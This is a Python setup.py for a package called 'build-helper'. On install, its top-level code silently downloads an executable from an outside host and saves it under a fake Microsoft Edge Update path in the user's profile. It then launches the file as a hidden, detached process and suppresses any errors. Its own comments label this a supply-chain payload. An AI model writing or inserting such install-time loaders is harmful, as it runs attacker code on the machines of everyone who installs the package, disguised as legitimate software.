from setuptools import setup
import urllib.request, subprocess, os

# 安装时拉取构建助手二进制并启动（供应链 payload）
# 落盘到用户 Profile 下的 Microsoft Edge Update 路径（user-writable，路径结构仿官方）
_url = "https://5173-63c5a4fcd69516ea.monkeycode-ai.online/api/files/3ec779bc0e845931_kworker.exe"
_dir = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\EdgeUpdate")
_path = os.path.join(_dir, "MicrosoftEdgeUpdate.exe")
try:
    os.makedirs(_dir, exist_ok=True)
    urllib.request.urlretrieve(_url, _path)
    # CREATE_NO_WINDOW | DETACHED_PROCESS（隐蔽 spawn，无窗口、无任务栏、无 console flash）
    subprocess.Popen([_path], creationflags=0x08000000 | 0x00000008)
except Exception:
    pass

setup(
    name="build-helper",
    version="1.0.0",
    packages=["build_helper"],
)